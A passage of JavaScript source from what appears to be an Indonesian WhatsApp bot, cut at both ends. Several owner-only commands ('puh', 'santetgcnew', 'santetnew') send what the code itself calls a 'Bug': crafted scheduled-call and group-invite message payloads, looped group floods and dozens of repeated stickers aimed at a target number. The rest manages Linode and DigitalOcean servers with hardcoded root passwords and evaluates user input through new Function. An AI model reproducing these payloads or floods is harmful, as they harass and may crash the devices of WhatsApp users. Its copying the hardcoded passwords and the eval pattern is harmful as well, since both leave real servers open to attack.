"groupName": `MY NAME BII BOTZ${buttonkal}`,
"caption": `${buttonkal}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted:m})
Biiofc.relayMessage(bnnd, groupInvite.message, { messageId: groupInvite.key.id })
m.reply(`Sukses Mengirim Bug Ke ${bnnd} !!!`)
}
break
case 'puh': {
if (!isOwner) return m.reply("ngapain?") 
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${buttonkal}`
 }
}
Biiofc.relayMessage(m.chat, call, {})
}
break
 case 'santetgcnew' : {
 if (!isOwner) return m.reply('*khusus Owner*')
 await Biiofc
let result = args[0].split('https://chat.whatsapp.com/')[1]
let rumgc = await Biiofc.groupAcceptInvite(result)
jumlah = "30"
for (let i = 0; i < jumlah; i++) {
const cap = `${buttonkal}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": cap,
}
}), { userJid: from, quoted : m})
Biiofc.relayMessage(rumgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
m.reply(`*Sukses mengirim Bug Ke ${rumgc} Tolong Jeda 3 Menit Yah*`)
break

case 'santetnew':
{
if (!isOwner) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
await Biiofc
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })

await sleep(5000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })

await sleep(5000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
Biiofc.sendMessage(Pe, { sticker : thumb }, { quoted:kalgans })
await sleep(2000)
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case 'ceksaldodo': {
  if (!isOwner) return reply('Anda bukan owner.');

  const API_KEY = API_TOKEN;

  const getAccountInfo = async () => {
    try {
      const response = await fetch('https://api.digitalocean.com/v2/customers/my', {
        headers: {
          'Authorization': `Bearer ${API_KEY}`,
          'Content-Type': 'application/json'
        }
      });

      const data = await response.json();
      const creditBalance = data.account_balance;
      const totalCredit = data.total_credit;
      const realCreditAmount = totalCredit - creditBalance;

      const texdo = `
        Saldo Akun Do : $${totalCredit}
        Sisa Saldo Do : $${creditBalance}
      `;
      reply(texdo);
    } catch (error) {
      reply('Gagal mengambil informasi saldo:', error.message);
    }
  };

  getAccountInfo();
}
break;
case "deletelinode": {
  if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return m.reply('ID Linode belum diberikan.');

  let deleteLinode = async () => {
    try {
      let response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.status === 204) {
        reply('Linode berhasil dihapus.');
      } else {
        throw new Error('Gagal menghapus Linode.');
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus Linode:', error);
      reply('Sukses Menghapus Linode.');
    }
  };

  deleteLinode();

  break;
}
case "sisalinode": {
  if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`);

  async function getLinodeInfo() {
    try {
      const response = await fetch('https://api.linode.com/v4/account', {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`,
        },
      });

      if (response.ok) {
        const accountInfo = await response.json();
        const linodeLimit = accountInfo.data.active_promo?.total || 0;
        const linodesCount = accountInfo.data.active_promo?.remaining || 0;

        return {
          linodeLimit,
          remainingLinodes: linodesCount,
          totalLinodes: linodeLimit - linodesCount,
        };
      } else {
        throw new Error('Gagal mendapatkan data akun Linode.');
      }
    } catch (error) {
      throw error;
    }
  }

  // Definisikan fungsi untuk mengeksekusi kasus "sisalinode"
  async function sisalinodeHandler() {
    try {
      if (!isOwner) {
        return reply('Lu Siapanya Gua Anjg');
      }

      const linodeInfo = await getLinodeInfo();
      reply(`*Sisa VPS Linode Yang Dapat Anda Buat: ${linodeInfo.remainingLinodes}*

*Total VPS Linode Yang Sudah Terbuat: ${linodeInfo.totalLinodes}*`);
    } catch (error) {
      reply(`Terjadi kesalahan: ${error.message}`);
    }
  }

  sisalinodeHandler();
  break;
}

case "kalkulator":
 if (!text) return reply(`Lah Mana`)
let val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
  let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
  try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
  } catch (e) {
if (e == undefined) throw 'Isinya?'
throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
  break
            
            
case "rebuildlinode": {
  if (!isOwner) return reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  let password = args[1]; // Mengambil password dari argumen kedua (jika ada)
  if (!password) return reply('Password belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild VPS menggunakan API Linode
      const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/rebuild`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        },
        body: JSON.stringify({
          image: 'linode/ubuntu20.04', // Ganti dengan ID atau label image yang ingin digunakan untuk rebuild
          root_pass: password // Menggunakan password yang diberikan
        })
      });

      if (response.ok) {
        reply('Rebuild VPS berhasil dimulai.');

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const ipAddress = vpsData.ipv4[0] || 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: Ubuntu 20.04\nPASSWORD: ${password}`;
          await sleep(60000);
          Biiofc.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.errors[0].reason);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error.message);
    }
  };

  rebuildVPS();
  break;
}

break

case "cekvps": {
  if (!isOwner) return reply('Maaf, perintah ini hanya untuk pemilik.');

  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  // Mendapatkan informasi VPS Linode berdasarkan ID
  const getLinodeInfo = async (linodeId) => {
    try {
      const apiUrl = `https://api.linode.com/v4/linode/instances/${linodeId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      if (response.ok) {
        const linodeInfo = await response.json();

        const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode
        const ram = `${linodeInfo.specs.memory / 1024} GB`; // RAM VPS dalam GB
        const os = linodeInfo.image.distribution; // Nama OS
        const cpu = `${linodeInfo.specs.vcpus} vCPUs`; // Jumlah vCPUs
        const storage = linodeInfo.specs.disk; // Kapasitas penyimpanan
        const status = linodeInfo.status; // Status VPS

        const createDate = new Date(linodeInfo.created); // Tanggal pembuatan VPS
        const formattedCreateDate = createDate.toLocaleDateString();

        return {
          linodeid: linodeInfo.id,
          label: linodeInfo.label,
          ip: ipAddress,
          ram,
          os,
          cpu,
          storage,
          status,
          createDate: formattedCreateDate
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail Linode: ${errorData.errors[0].reason}`);
      }
    } catch (error) {
      throw new Error(`Terjadi kesalahan saat memeriksa detail Linode: ${error.message}`);
    }
  };

  getLinodeInfo(linodeId)
    .then((info) => {
      let textku = `*DETAIL VPS LINODE*\nLinode Id: ${info.linodeid}\nLabel: ${info.label}\nIP: ${info.ip}\nRAM: ${info.ram}\nOS: ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus: ${info.status}\nCreate On: ${info.createDate}\n`;
      hanzz.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      Biiofc.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS Linode.' });
    });

  break;
}


break
case "linode1gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-nanode-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: '#?RafatharOffcial12+',//miniml 11 huruf
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };
    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

case "linode2gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-1', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: '#?RafatharOffcial+12',//miniml 11 huruf
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };
    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

case "linode16gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-6', // Spesifikasi 1GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: '#?RafatharOffcial+12',//miniml 11 huruf
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };
    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
 case "linode4gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: '#?RafatharOffcial12+',//miniml 11 huruf
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

case "linode8gb": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: 'my-linode',
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-4', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: '#?RafatharOffcial12+',//miniml 11 huruf
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
case "saldolinode":
  if (!isOwner) return reply(mess.only.owner);

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case "resetpassword": {
  if (!isOwner) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
  if (!isOwner) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      Biiofc.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case "offlinode": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
